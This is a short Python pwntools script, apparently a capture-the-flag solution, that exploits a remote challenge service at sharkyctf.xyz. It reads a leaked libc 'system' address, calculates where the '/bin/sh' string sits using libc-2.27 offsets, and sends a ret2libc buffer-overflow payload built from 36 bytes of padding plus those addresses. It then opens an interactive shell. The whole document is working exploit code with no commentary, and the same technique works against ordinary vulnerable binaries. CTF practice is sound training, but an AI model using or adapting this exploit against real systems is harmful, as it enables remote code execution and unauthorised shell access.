from pwn import *

p = remote("sharkyctf.xyz", 20334)
libc = ELF("./libc-2.27.so")

libc_system = libc.symbols["system"]
libc_binsh = libc.search("/bin/sh\x00").next()

offset = 36
system_leak = int(p.recvline().split(" ")[2],16)
bin_sh_addr = p32(system_leak + (libc_binsh - libc_system))
system_addr = p32(system_leak)

payload = "A"*offset + system_addr + "A"*4 + bin_sh_addr
p.sendline(payload)
p.interactive()

p.close()
